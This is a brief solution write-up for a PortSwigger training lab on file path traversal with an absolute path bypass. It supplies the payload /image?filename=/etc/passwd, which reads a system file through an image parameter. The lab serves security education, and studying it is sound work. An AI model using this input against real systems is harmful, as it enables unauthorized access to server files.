# File path traversal, traversal sequences blocked with absolute path bypass
- Name: File path traversal, traversal sequences blocked with absolute path bypass
- URL: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
- Level: Medium Time: 1 min
---------------------------------------------------------------------------------


## Solution
1. Find an image.
2. Edit the Source Path for it to add `/etc/passwd` like the next: `/image?filename=/etc/passwd`